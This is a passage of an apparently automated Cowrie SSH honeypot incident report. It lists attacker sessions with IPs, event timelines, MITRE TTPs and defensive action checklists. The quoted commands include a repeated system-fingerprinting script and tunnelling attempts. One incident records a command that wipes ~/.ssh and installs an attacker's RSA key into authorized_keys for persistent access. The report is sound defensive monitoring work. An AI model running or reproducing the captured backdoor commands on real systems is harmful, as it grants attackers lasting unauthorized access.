| `2026-07-24 17:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6565e564b7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:12 |
| **Last Seen** | 2026-07-24 17:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:12:06` | `cowrie.session.connect` |
| `2026-07-24 17:12:06` | `cowrie.client.version` |
| `2026-07-24 17:12:06` | `cowrie.client.kex` |
| `2026-07-24 17:12:10` | `cowrie.login.success` |
| `2026-07-24 17:12:12` | `cowrie.session.params` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:12` | `cowrie.command.success` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:12` | `cowrie.command.input` |
| `2026-07-24 17:12:13` | `cowrie.log.closed` |
| `2026-07-24 17:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436af3803d02

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:13 |
| **Last Seen** | 2026-07-24 17:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:13:25` | `cowrie.session.connect` |
| `2026-07-24 17:13:26` | `cowrie.client.version` |
| `2026-07-24 17:13:26` | `cowrie.client.kex` |
| `2026-07-24 17:13:29` | `cowrie.login.success` |
| `2026-07-24 17:13:31` | `cowrie.session.params` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:31` | `cowrie.command.success` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:31` | `cowrie.command.input` |
| `2026-07-24 17:13:32` | `cowrie.log.closed` |
| `2026-07-24 17:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9032000df20c

| Field | Detail |
|---|---|
| **Source IP** | `39.164.94[.]190` |
| **First Seen** | 2026-07-24 17:13 |
| **Last Seen** | 2026-07-24 17:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:13:35` | `cowrie.session.connect` |
| `2026-07-24 17:13:36` | `cowrie.client.version` |
| `2026-07-24 17:13:36` | `cowrie.client.kex` |
| `2026-07-24 17:13:38` | `cowrie.login.success` |
| `2026-07-24 17:13:39` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.94[.]190` to AbuseIPDB if not already reported
- [ ] Block `39.164.94[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ecde53082a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:14 |
| **Last Seen** | 2026-07-24 17:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:14:44` | `cowrie.session.connect` |
| `2026-07-24 17:14:44` | `cowrie.client.version` |
| `2026-07-24 17:14:44` | `cowrie.client.kex` |
| `2026-07-24 17:14:47` | `cowrie.login.success` |
| `2026-07-24 17:14:49` | `cowrie.session.params` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:49` | `cowrie.command.success` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:49` | `cowrie.command.input` |
| `2026-07-24 17:14:51` | `cowrie.log.closed` |
| `2026-07-24 17:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f165925aad4d

| Field | Detail |
|---|---|
| **Source IP** | `47.84.108[.]75` |
| **First Seen** | 2026-07-24 17:15 |
| **Last Seen** | 2026-07-24 17:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:15:31` | `cowrie.session.connect` |
| `2026-07-24 17:15:31` | `cowrie.login.success` |
| `2026-07-24 17:15:32` | `cowrie.session.params` |
| `2026-07-24 17:15:32` | `cowrie.command.input` |
| `2026-07-24 17:15:32` | `cowrie.command.failed` |
| `2026-07-24 17:15:32` | `cowrie.command.input` |
| `2026-07-24 17:15:32` | `cowrie.command.failed` |
| `2026-07-24 17:15:32` | `cowrie.command.input` |
| `2026-07-24 17:15:34` | `cowrie.log.closed` |
| `2026-07-24 17:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.84.108[.]75` to AbuseIPDB if not already reported
- [ ] Block `47.84.108[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23939a06080a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:16 |
| **Last Seen** | 2026-07-24 17:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:16:00` | `cowrie.session.connect` |
| `2026-07-24 17:16:01` | `cowrie.client.version` |
| `2026-07-24 17:16:01` | `cowrie.client.kex` |
| `2026-07-24 17:16:03` | `cowrie.login.success` |
| `2026-07-24 17:16:06` | `cowrie.session.params` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:06` | `cowrie.command.success` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:06` | `cowrie.command.input` |
| `2026-07-24 17:16:07` | `cowrie.log.closed` |
| `2026-07-24 17:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed66c3fa2fa7

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-07-24 17:17 |
| **Last Seen** | 2026-07-24 17:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:17:04` | `cowrie.session.connect` |
| `2026-07-24 17:17:05` | `cowrie.client.version` |
| `2026-07-24 17:17:05` | `cowrie.client.kex` |
| `2026-07-24 17:17:08` | `cowrie.login.success` |
| `2026-07-24 17:17:08` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79e2a48c7521

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:17 |
| **Last Seen** | 2026-07-24 17:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:17:19` | `cowrie.session.connect` |
| `2026-07-24 17:17:20` | `cowrie.client.version` |
| `2026-07-24 17:17:20` | `cowrie.client.kex` |
| `2026-07-24 17:17:23` | `cowrie.login.success` |
| `2026-07-24 17:17:25` | `cowrie.session.params` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:25` | `cowrie.command.success` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:25` | `cowrie.command.input` |
| `2026-07-24 17:17:26` | `cowrie.log.closed` |
| `2026-07-24 17:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51a11ce63acb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:18 |
| **Last Seen** | 2026-07-24 17:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:18:37` | `cowrie.session.connect` |
| `2026-07-24 17:18:37` | `cowrie.client.version` |
| `2026-07-24 17:18:37` | `cowrie.client.kex` |
| `2026-07-24 17:18:40` | `cowrie.login.success` |
| `2026-07-24 17:18:42` | `cowrie.session.params` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.command.success` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.command.input` |
| `2026-07-24 17:18:42` | `cowrie.log.closed` |
| `2026-07-24 17:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8775df4900

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:19 |
| **Last Seen** | 2026-07-24 17:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:19:53` | `cowrie.session.connect` |
| `2026-07-24 17:19:53` | `cowrie.client.version` |
| `2026-07-24 17:19:54` | `cowrie.client.kex` |
| `2026-07-24 17:19:55` | `cowrie.login.success` |
| `2026-07-24 17:19:57` | `cowrie.session.params` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:57` | `cowrie.command.success` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:57` | `cowrie.command.input` |
| `2026-07-24 17:19:58` | `cowrie.log.closed` |
| `2026-07-24 17:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf14bdfc4220

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:21 |
| **Last Seen** | 2026-07-24 17:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:21:10` | `cowrie.session.connect` |
| `2026-07-24 17:21:11` | `cowrie.client.version` |
| `2026-07-24 17:21:11` | `cowrie.client.kex` |
| `2026-07-24 17:21:14` | `cowrie.login.success` |
| `2026-07-24 17:21:16` | `cowrie.session.params` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.command.success` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.command.input` |
| `2026-07-24 17:21:16` | `cowrie.log.closed` |
| `2026-07-24 17:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-118e25b70b60

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:22 |
| **Last Seen** | 2026-07-24 17:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:22:28` | `cowrie.session.connect` |
| `2026-07-24 17:22:29` | `cowrie.client.version` |
| `2026-07-24 17:22:29` | `cowrie.client.kex` |
| `2026-07-24 17:22:32` | `cowrie.login.success` |
| `2026-07-24 17:22:34` | `cowrie.session.params` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:34` | `cowrie.command.success` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:34` | `cowrie.command.input` |
| `2026-07-24 17:22:35` | `cowrie.log.closed` |
| `2026-07-24 17:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5d958caecb

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-07-24 17:23 |
| **Last Seen** | 2026-07-24 17:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:23:15` | `cowrie.session.connect` |
| `2026-07-24 17:23:15` | `cowrie.client.version` |
| `2026-07-24 17:23:16` | `cowrie.client.kex` |
| `2026-07-24 17:23:16` | `cowrie.login.success` |
| `2026-07-24 17:23:18` | `cowrie.session.params` |
| `2026-07-24 17:23:18` | `cowrie.command.input` |
| `2026-07-24 17:23:18` | `cowrie.command.failed` |
| `2026-07-24 17:23:18` | `cowrie.log.closed` |
| `2026-07-24 17:23:19` | `cowrie.session.params` |
| `2026-07-24 17:23:19` | `cowrie.command.input` |
| `2026-07-24 17:23:19` | `cowrie.session.file_download` |
| `2026-07-24 17:23:19` | `cowrie.log.closed` |
| `2026-07-24 17:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c5740d2f38

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-07-24 17:23 |
| **Last Seen** | 2026-07-24 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:23:19` | `cowrie.session.connect` |
| `2026-07-24 17:23:19` | `cowrie.client.version` |
| `2026-07-24 17:23:19` | `cowrie.client.kex` |
| `2026-07-24 17:23:20` | `cowrie.login.success` |
| `2026-07-24 17:23:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.50.142[.]78` to AbuseIPDB if not already reported
- [ ] Block `189.50.142[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd52f109eab

| Field | Detail |
|---|---|
| **Source IP** | `189.50.142[.]78` |
| **First Seen** | 2026-07-24 17:23 |
| **Last Seen** | 2026-07-24 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
